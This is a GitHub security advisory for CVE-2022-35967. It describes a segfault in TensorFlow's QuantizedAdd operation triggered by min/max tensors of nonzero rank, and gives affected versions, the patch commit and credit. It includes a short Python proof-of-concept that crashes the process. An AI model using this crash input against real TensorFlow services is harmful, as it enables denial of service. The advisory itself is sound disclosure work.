# [M] TensorFlow vulnerable to segfault in `QuantizedAdd`

## Summary
Severity: Medium
Advisory: GHSA-v6h3-348g-6h5x
CVE: CVE-2022-35967
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-v6h3-348g-6h5x
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizedAdd` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

Toutput = tf.qint32
x = tf.constant(140, shape=[1], dtype=tf.quint8)
y = tf.constant(26, shape=[10], dtype=tf.quint8)
min_x = tf.constant([], shape=[0], dtype=tf.float32)
max_x = tf.constant(0, shape=[], dtype=tf.float32)
min_y = tf.constant(0, shape=[], dtype=tf.float32)
max_y = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y, Toutput=Toutput)
```

### Patches
We have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v6h3-348g-6h5x
- https://nvd.nist.gov/vuln/detail/CVE-2022-35967
- https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
